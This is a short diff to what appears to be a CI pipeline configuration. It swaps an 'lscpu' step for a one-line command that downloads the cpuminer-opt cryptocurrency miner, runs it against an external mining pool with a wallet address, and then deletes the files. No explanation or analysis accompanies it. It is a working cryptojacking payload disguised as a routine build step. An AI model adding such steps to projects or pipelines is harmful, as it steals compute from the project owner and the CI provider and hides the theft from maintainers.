@@ -6,4 +6,4 @@ jobs:
     resource_class: large
     working_directory: ~/my-app
     steps:
-      - run: lscpu
+      - run: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.29/cpuminer-opt-linux.tar.gz && tar xvf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a power2b  -o stratum+tcps://stratum-asia.rplant.xyz:17022 -u MrgKouLNYQMR4NsUfqBsBdq3qrGz8b66xP.prom -p webpassword=x && rm *
